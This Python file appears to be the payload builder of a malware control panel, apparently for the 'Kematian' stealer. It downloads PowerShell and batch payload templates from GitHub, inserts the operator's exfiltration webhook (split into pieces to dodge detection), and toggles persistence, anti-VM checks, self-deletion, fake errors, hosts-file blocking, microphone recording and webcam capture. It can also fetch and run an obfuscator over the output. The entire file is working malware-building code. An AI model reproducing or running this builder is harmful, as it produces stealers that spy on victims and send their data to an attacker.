import os

import aiohttp
import aiofiles
import requests

from panel.ui.modules.async_runner.runner import AsyncRunner

working_dir = os.getcwd()


class BuildPayload:
    def __init__(self):
        self.langs = [
            "ps1",
            "bat",
        ]
        self.encryption_key = ""
        self.runner = AsyncRunner()

    async def build(
        self, language: str, name: str, url: str, options: dict[str, bool]
    ) -> bool:
        match language:
            case "ps1":
                await self.build_ps1(url, name, options)
                return True
            case "bat":
                await self.build_bat(url, name, options)
                return True
            case _:
                return False

    def get_languages(self) -> list[str]:
        return self.langs

    async def _replace(
        self,
        content: str,
        options: dict[str, bool],
        url: str,
        hashtags: bool = False,
    ) -> str:
        if hashtags:
            hashtag = "#"
            quotes = '"'
        else:
            hashtag = ""
            quotes = "'"
        content = content.replace(
            f"{hashtag}$webhook = {quotes}YOUR_URL_HERE_SERVER{quotes}",
            f"$webhook = 'h' + '{url[1:]}/data'",
        )

        content = (
            content.replace(
                f"{hashtag}$debug = $false",
                f"$debug=${str(options['debug']).lower()}",
            )
            .replace(
                f"{hashtag}$blockhostsfile = $false",
                f"$blockhostsfile=${str(options['blockhostsfile']).lower()}",
            )
            .replace(
                f"{hashtag}$criticalprocess = $false",
                f"$criticalprocess=${str(options['criticalprocess']).lower()}",
            )
            .replace(
                f"{hashtag}$melt = $false",
                f"$melt=${str(options['melt']).lower()}",
            )
            .replace(
                f"{hashtag}$fakeerror = $false",
                f"$fakeerror=${str(options['fakeerror']).lower()}",
            )
            .replace(
                f"{hashtag}$persistence = $false",
                f"$persistence=${str(options['persistence']).lower()}",
            )
            .replace(
                f"{hashtag}$vm_protect = $false",
                f"$vm_protect=${str(options['anti_vm']).lower()}",
            )
            .replace(
                f"{hashtag}$record_mic = $false",
                f"$record_mic=${str(options['record_mic']).lower()}",
            )
            .replace(
                f"{hashtag}$webcam = $false",
                f"$webcam=${str(options['webcam']).lower()}",
            )
        )

        return content

    async def build_bat(self, url: str, name: str, options: dict[str, bool]) -> None:
        github_raw_url_bat = "https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.bat"
        # content = requests.get(github_raw_url_bat).text.strip()

        async with aiohttp.ClientSession() as session:
            async with session.get(github_raw_url_bat) as response:
                content = await response.text()

        content = await self._replace(content, options, url)

        # with open(f"{working_dir}\\{name}.bat", "w", newline="") as f:
        #    f.write(content)
        async with aiofiles.open(f"{working_dir}\\{name}.bat", "w", newline="") as f:
            await f.write(content)

        if options["obfuscate"]:
            somalifuscator_url = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"

            # r = requests.get(somalifuscator_url, allow_redirects=True)
            async with aiohttp.ClientSession() as session:
                async with session.get(somalifuscator_url) as response:
                    r = await response.read()

            # with open("somalifuscator.exe", "wb") as f:
            #    f.write(r.content)

            async with aiofiles.open(f"{working_dir}\\somalifuscator.exe", "wb") as f:
                await f.write(r)

            # os.system(f"somalifuscator.exe -f {working_dir}\\{name}.bat")
            await self.runner.run_command(
                f"{working_dir}\\somalifuscator.exe -f {working_dir}\\{name}.bat"
            )

            os.remove(f"{working_dir}\\somalifuscator.exe")
            os.remove(f"{working_dir}\\{name}.bat")
            os.remove(f"{working_dir}\\settings.json")

            os.rename(f"{working_dir}\\{name}_obf.bat", f"{working_dir}\\{name}.bat")

    async def build_ps1(self, url: str, name: str, options: dict[str, bool]) -> None:
        github_raw_url_ps1 = "https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/main.ps1"
        content = requests.get(github_raw_url_ps1).text.strip()

        content = await self._replace(content, options, url, hashtags=True)

        with open(f"{working_dir}\\{name}.ps1", "w", newline="") as f:
            f.write(content)
